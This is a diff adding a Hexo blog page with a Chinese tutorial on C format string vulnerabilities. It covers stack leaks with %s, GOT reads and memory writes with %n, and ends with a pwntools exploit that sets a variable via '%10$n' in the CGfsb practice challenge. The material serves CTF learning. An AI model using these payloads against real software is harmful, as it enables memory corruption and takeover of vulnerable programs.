@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>格式化字符串漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="仅供个人学习参考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://example.com/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="仅供个人学习参考">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreicjvfhpvfgoxudw334wn632junbgjo7ro2e33n74chpy22k2f7gxe">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreieohlcefmwsos6gpqcbp4krlfg6t65cfjkvbh6p34rcpp4ggnf4uu">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreibuzmx64bxsmtrarmdv6r562nmb6wj4qn42xpdnie7yzkocshrmfu">
+<meta property="article:published_time" content="2024-03-26T11:54:40.000Z">
+<meta property="article:modified_time" content="2024-03-28T11:26:21.219Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gateway.pinata.cloud/ipfs/bafkreicjvfhpvfgoxudw334wn632junbgjo7ro2e33n74chpy22k2f7gxe">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-格式化字符串漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2024-03-26T11:54:40.000Z" itemprop="datePublished">2024-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      格式化字符串漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><em>仅供个人学习参考</em>  </p>
+<span id="more"></span>
+
+<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>漏洞来自c语言的printf函数，因为printf函数不会检查参数的个数与格式化字符串的个数是否对应，也就是说，只要有格式化参数在，即使我们没有往printf函数传去参数，它也会默认在栈上向后（向高地址）寻找对应参数并根据格式化字符串来解析，举个栗子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prinf(<span class="string">&quot;%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们虽然没有给printf传参，但它依旧会把后面地址（高地址）上的内容作为参数来使用，栈的情况如下图</p>
+<p><img src="https://gateway.pinata.cloud/ipfs/bafkreicjvfhpvfgoxudw334wn632junbgjo7ro2e33n74chpy22k2f7gxe" alt="stack"></p>
+<p>可以看到，格式化字符串的内容也是放在了栈上，因为我们没有传参，所以printf会把0xffffada8、0xffffada9、0xffffadaa作为参数，根据%s，将其解析并以字符串形式输出<br>有如下语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>如果我们能控制buf的内容，就可以利用格式字符串漏洞</p>
+<h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>就像上面举的例子，我们只要多写几个%s，就可将栈上的内，容解析并以字符串形式输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>当然，并非所有栈上的的地址都可以被解析，所以上述方法可能会（且大概率会）造成程序崩溃<del>当然这也是一种攻击手段，只不过作用是让服务器瘫痪</del></p>
+<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>如果此时栈上存放着got表的某个表项的内容，我们可以利用%s来读取它，并进一步获取libc版本，如果栈上未存放，我们可以将需要的got表表项地址填入栈上（情况与允许的话），然后再读取内容。</p>
+<h3 id="修改栈内存"><a href="#修改栈内存" class="headerlink" title="修改栈内存"></a>修改栈内存</h3><p>此时我们需要用到 <strong>%n</strong> 这个格式字符串，其作用是将已经打印出的字节数存放到相应的整形变量上<br>例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ssss%n&quot;</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d&quot;</span>,a);<span class="comment">//输出a=4</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将a换成所需修改的（栈上的）变量的地址，就可以修改栈内存</p>
+<h3 id="修改任意地址内存"><a href="#修改任意地址内存" class="headerlink" title="修改任意地址内存"></a>修改任意地址内存</h3><p>原理与修改栈内存一样，换个目标地址就行</p>
+<hr>
+<p><em>覆写小数字：</em><br>如果要覆写的数字较小，比如为2（小于四字节），这样即使在32位的情况下，目标地址也占用了4个字节那么%n输出的数据就不会小于4<br>解决办法：先填入所需覆写的数据大小对应的字符串（如果要覆写成2，就填’aa’），再填入目标地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;aa&#x27;</span>,<span class="string">b&#x27;%k$naa&#x27;</span>,addr]) <span class="comment">## k记得根据实际情况改变 n后面的&#x27;aa&#x27;是为了补全四个字节</span></span><br></pre></td></tr></table></figure>
+
+<p>此时栈中情况如图</p>
+<p><img src="https://gateway.pinata.cloud/ipfs/bafkreieohlcefmwsos6gpqcbp4krlfg6t65cfjkvbh6p34rcpp4ggnf4uu" alt="a"></p>
+<hr>
+<p><em>覆写大数字</em><br>如果要覆写的数字比较大，一般情况下我们无法一次性填入几十甚至几百的字符，此时我们可以利用格式化字符的宽度设置来覆写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;%20c&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>,addr]) <span class="comment"># 此时会在字符&#x27;a&#x27;前面补19个空格,使得其宽度为20</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>攻防世界的CGfsb</strong></p>
+<p>用ida查看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibuzmx64bxsmtrarmdv6r562nmb6wj4qn42xpdnie7yzkocshrmfu" alt="ida"></p>
+<p>没有栈溢出，发现存在格式化字符串漏洞，我们的目标是使得pwnme&#x3D;8，然后即可获得flag<br>思路：可以往s写入pwnme的地址，然后再利用%n往pwnme写入8</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr=<span class="number">0x0804A068</span></span><br><span class="line">payload=flat([pwnme_addr,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;%10$n&#x27;</span>]) <span class="comment">## 10$是指往第十个参数（即printf的第十一个参数，格式化字符串的地址是printf的第一个参数）填入数据，pwnme的地址加上&#x27;aaaa&#x27;刚好八个字节</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;jack&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;please:&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" data-id="clydtigrh0011cgbq9ibn6bug" data-title="格式化字符串漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/04/01/ret2csu/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ret2csu
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/03/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6+got%E8%A1%A8plt%E8%A1%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">延迟绑定机制+got表plt表</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VScode/" rel="tag">VScode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" rel="tag">动态链接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/" rel="tag">操作系统 进程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" rel="tag">虚拟内存</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ROP/" style="font-size: 20px;">ROP</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/VScode/" style="font-size: 10px;">VScode</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/ubuntu/" style="font-size: 20px;">ubuntu</a> <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" style="font-size: 20px;">动态链接</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/" style="font-size: 10px;">操作系统 进程</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" style="font-size: 10px;">虚拟内存</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/05/20/%E6%A0%88%E8%BF%81%E7%A7%BB/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/">VScode远程连接虚拟机以及免密登录</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/15/pwn-environment/">pwn-environment</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/">操作系统——进程</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">hexo推送文章失败解决方案</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
